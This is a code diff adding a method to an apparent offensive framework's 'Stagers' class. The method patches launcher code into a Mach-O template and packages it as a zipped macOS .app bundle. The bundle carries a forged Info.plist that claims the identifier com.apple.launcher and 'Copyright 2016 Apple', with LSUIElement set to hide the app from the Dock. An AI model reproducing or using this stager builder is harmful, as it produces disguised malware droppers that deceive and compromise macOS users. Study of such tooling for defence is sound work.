@@ -396,3 +396,136 @@ class Stagers:
             return patchedDylib
         else:
             print helpers.color("[!] Unable to patch dylib")
+
+
+    def generate_appbundle(self, launcherCode, Arch, icon):
+
+        """
+        Generates an application. The embedded executable is a macho binary with the python interpreter.
+        """
+
+        import macholib.MachO
+        import shutil
+        import os
+
+        MH_EXECUTE = 2
+
+        if Arch == 'x64':
+
+            f = open(self.installPath + "/data/misc/apptemplateResources/x64/launcher.app/Contents/MacOS/launcher")
+            directory = self.installPath + "/data/misc/apptemplateResources/x64/launcher.app/"
+        else:
+            f = open(self.installPath + "/data/misc/apptemplateResources/x86/launcher.app/Contents/MacOS/launcher")
+            directory = self.installPath + "/data/misc/apptemplateResources/x86/launcher.app/"
+
+        macho = macholib.MachO.MachO(f.name)
+
+        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
+            print helpers.color("[!] Macho binary template is not the correct filetype")
+            return ""
+
+        cmds = macho.headers[0].commands
+
+        for cmd in cmds:
+            count = 0
+            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
+                count += 1
+                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
+                    count += 1
+                    for section in cmd[count]:
+                        if section.sectname.strip('\x00') == '__cstring':
+                            offset = int(section.offset)
+                            placeHolderSz = int(section.size) - 52
+
+        template = f.read()
+        f.close()
+
+        if placeHolderSz and offset:
+
+            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            patchedBinary = template[:offset]+launcher+template[(offset+len(launcher)):]
+            tmpdir = "/tmp/application/launcher.app/"
+            shutil.copytree(directory, tmpdir)
+            f = open(tmpdir + "Contents/MacOS/launcher","wb")
+            f.write(patchedBinary)
+            f.close()
+            os.chmod(tmpdir+"Contents/MacOS/launcher", 0777)
+
+            if icon != '':
+                iconfile = os.path.splitext(icon)[0].split('/')[-1]
+                shutil.copy2(icon,tmpdir+"Contents/Resources/"+iconfile+".icns")
+                appPlist = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>BuildMachineOSBuild</key>
+    <string>15G31</string>
+    <key>CFBundleDevelopmentRegion</key>
+    <string>en</string>
+    <key>CFBundleExecutable</key>
+    <string>launcher</string>
+    <key>CFBundleIconFile</key>
+    <string>%s</string>
+    <key>CFBundleIdentifier</key>
+    <string>com.apple.launcher</string>
+    <key>CFBundleInfoDictionaryVersion</key>
+    <string>6.0</string>
+    <key>CFBundleName</key>
+    <string>launcher</string>
+    <key>CFBundlePackageType</key>
+    <string>APPL</string>
+    <key>CFBundleShortVersionString</key>
+    <string>1.0</string>
+    <key>CFBundleSignature</key>
+    <string>????</string>
+    <key>CFBundleSupportedPlatforms</key>
+    <array>
+        <string>MacOSX</string>
+    </array>
+    <key>CFBundleVersion</key>
+    <string>1</string>
+    <key>DTCompiler</key>
+    <string>com.apple.compilers.llvm.clang.1_0</string>
+    <key>DTPlatformBuild</key>
+    <string>7D1014</string>
+    <key>DTPlatformVersion</key>
+    <string>GM</string>
+    <key>DTSDKBuild</key>
+    <string>15E60</string>
+    <key>DTSDKName</key>
+    <string>macosx10.11</string>
+    <key>DTXcode</key>
+    <string>0731</string>
+    <key>DTXcodeBuild</key>
+    <string>7D1014</string>
+    <key>LSApplicationCategoryType</key>
+    <string>public.app-category.utilities</string>
+    <key>LSMinimumSystemVersion</key>
+    <string>10.11</string>
+    <key>LSUIElement</key>
+    <true/>
+    <key>NSHumanReadableCopyright</key>
+    <string>Copyright 2016 Apple. All rights reserved.</string>
+    <key>NSMainNibFile</key>
+    <string>MainMenu</string>
+    <key>NSPrincipalClass</key>
+    <string>NSApplication</string>
+</dict>
+</plist>
+""" % iconfile
+                f = open(tmpdir+"Contents/Info.plist", "w")
+                f.write(appPlist)
+                f.close()
+
+            shutil.make_archive("/tmp/launcher", 'zip', "/tmp/application")
+            shutil.rmtree(tmpdir)
+
+            f = open("/tmp/launcher.zip","rb")
+            zipbundle = f.read()
+            f.close()
+            os.remove("/tmp/launcher.zip")
+            return zipbundle
+        
+            
+        else:
+            print helpers.color("[!] Unable to patch application")
